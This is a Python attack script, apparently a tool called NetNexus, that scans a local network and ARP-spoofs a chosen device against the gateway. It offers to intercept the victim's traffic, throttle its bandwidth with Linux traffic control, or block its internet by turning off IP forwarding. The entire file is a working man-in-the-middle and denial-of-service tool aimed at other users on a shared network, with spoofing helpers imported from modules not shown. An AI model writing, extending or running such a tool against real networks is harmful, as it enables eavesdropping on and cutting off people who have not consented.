import scapy.all as scapy
import os
import time
import sys
import subprocess
from core import scanner, spoof

def set_forwarding(state):
    """Enable or disable IP forwarding (1 to allow internet, 0 to kill it)."""
    val = "1" if state else "0"
    subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)

def set_limit(interface, speed):
    """Uses Linux Traffic Control to limit the target's bandwidth."""
    # First, clear any existing limits
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    
    # Apply new limit using Token Bucket Filter (tbf)
    # speed should be a string like '50kbps'
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", speed, "latency", "50ms", "burst", "1540"], check=True)
        print(f"[*] Bandwidth limited to {speed}")
    except subprocess.CalledProcessError:
        print(f"[-] Error: Could not set speed to {speed}. Check your format (e.g., 50kbps).")

def clear_limit(interface):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)

def main():
    iface = "wlan0" # Replace with your interface from 'ip a'
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root privileges.")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"
    device_memory = {}

    while True:
        print("\n" + "="*45)
        print("      NetNexus: Custom Control Mode")
        print("="*45)
        
        device_memory = scanner.scan(ip_range, device_memory)
        current_list = list(device_memory.values())
        
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            
            print(f"\nAction for {target['ip']} ({target['name']}):")
            print("[1] Intercept (Normal)")
            print("[2] Limit (Custom Speed)")
            print("[3] Kill (Block Internet)")
            mode = input("Choose Action: ")

            print(f"[*] Resolving Gateway MAC...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            if mode == "1":
                set_forwarding(True)
                clear_limit(iface)
            elif mode == "2":
                kbps = input("Enter limit in kbps (e.g., 20): ")
                speed_str = f"{kbps}kbps"
                set_forwarding(True)
                set_limit(iface, speed_str)
            elif mode == "3":
                set_forwarding(False)
                clear_limit(iface)

            print(f"[*] Attack Active on {target['ip']}...")
            packet_count = 0
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                packet_count += 2
                print(f"\r[+] Packets Sent: {packet_count} | Mode: {mode} | Target: {target['ip']}", end="")
                time.sleep(0.5)
                
        except (ValueError, IndexError):
            print("[-] Invalid Selection.")
        except KeyboardInterrupt:
            print("\n[*] Stopping... Cleaning up system settings.")
            set_forwarding(True)
            clear_limit(iface)
            spoof.restore(target['ip'], gateway_ip)
            spoof.restore(gateway_ip, target['ip'])
            time.sleep(1)

if __name__ == "__main__":
    main()
